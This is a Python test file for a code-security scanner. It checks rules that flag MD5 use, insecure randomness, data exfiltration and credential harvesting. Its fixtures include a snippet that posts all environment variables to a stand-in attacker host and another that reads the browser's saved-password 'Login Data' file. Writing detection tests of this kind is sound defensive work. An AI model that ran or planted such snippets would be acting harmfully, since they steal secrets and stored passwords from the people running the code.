from src.models import Severity
from src.rules.H_crypto.H3_weak_crypto_algorithms import H3WeakCryptoAlgorithmsRule
from src.rules.H_crypto.H5_weak_randomness import H5WeakRandomnessRule
from src.rules.L_malware.L2_suspicious_exfiltration import L2SuspiciousExfiltrationRule
from src.rules.L_malware.L6_credential_harvesting import L6CredentialHarvestingRule


def test_H3_detects_md5_usage(tmp_path):
    (tmp_path / "crypto.py").write_text(
        "import hashlib\ndigest = hashlib.md5(data).hexdigest()\n", encoding="utf-8"
    )

    records = H3WeakCryptoAlgorithmsRule().evaluate(tmp_path)

    assert len(records) == 1
    assert records[0].rule_id == "H-3"
    assert records[0].severity == Severity.HIGH


def test_H3_ignores_sha256_and_comment_only_md5(tmp_path):
    (tmp_path / "crypto.py").write_text(
        "# legacy md5 mention only\nimport hashlib\ndigest = hashlib.sha256(data).hexdigest()\n",
        encoding="utf-8",
    )

    assert H3WeakCryptoAlgorithmsRule().evaluate(tmp_path) == []


def test_H5_detects_random_used_for_token(tmp_path):
    (tmp_path / "tokens.py").write_text(
        "import random\n# session token generation\nvalue = random.random()\n",
        encoding="utf-8",
    )

    records = H5WeakRandomnessRule().evaluate(tmp_path)

    assert len(records) == 1
    assert records[0].rule_id == "H-5"
    assert records[0].severity == Severity.HIGH


def test_H5_ignores_secrets_token_urlsafe(tmp_path):
    (tmp_path / "tokens.py").write_text(
        "import secrets\nsession_token = secrets.token_urlsafe(32)\n", encoding="utf-8"
    )

    assert H5WeakRandomnessRule().evaluate(tmp_path) == []


def test_L2_detects_environment_exfiltration_to_external_url(tmp_path):
    (tmp_path / "stealer.py").write_text(
        "import os\nimport requests\nrequests.post('https://attacker.example/upload', json=os.environ)\n",
        encoding="utf-8",
    )

    records = L2SuspiciousExfiltrationRule().evaluate(tmp_path)

    assert len(records) >= 1
    assert records[0].rule_id == "L-2"
    assert records[0].severity == Severity.HIGH


def test_L2_ignores_normal_http_post_without_secret_source(tmp_path):
    (tmp_path / "client.py").write_text(
        "import requests\nrequests.post('https://api.example.com/events', json={'status': 'ok'})\n",
        encoding="utf-8",
    )

    assert L2SuspiciousExfiltrationRule().evaluate(tmp_path) == []


def test_L6_detects_browser_login_data_collection(tmp_path):
    (tmp_path / "collector.py").write_text(
        """
from pathlib import Path

login_db = Path('Login Data')
data = login_db.read_bytes()  # read browser password login data
""",
        encoding="utf-8",
    )

    records = L6CredentialHarvestingRule().evaluate(tmp_path)

    assert len(records) >= 1
    assert records[0].rule_id == "L-6"
    assert records[0].severity == Severity.HIGH


def test_L6_ignores_regular_config_file_read(tmp_path):
    (tmp_path / "config.py").write_text(
        "from pathlib import Path\nconfig = Path('settings.json').read_text()\n",
        encoding="utf-8",
    )

    assert L6CredentialHarvestingRule().evaluate(tmp_path) == []
